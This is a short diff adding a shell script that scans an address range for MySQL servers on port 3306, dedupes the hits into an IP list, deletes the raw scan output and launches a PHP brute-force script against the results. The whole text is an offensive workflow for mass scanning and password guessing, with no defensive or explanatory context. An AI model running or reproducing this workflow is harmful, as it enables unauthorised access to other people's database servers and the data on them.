@@ -1,0 +1,4 @@
+./ss 3306 -a $1 -s 7
+cat bios.txt |sort|uniq >ip.txt
+rm -rf bios.txt
+php brute.php
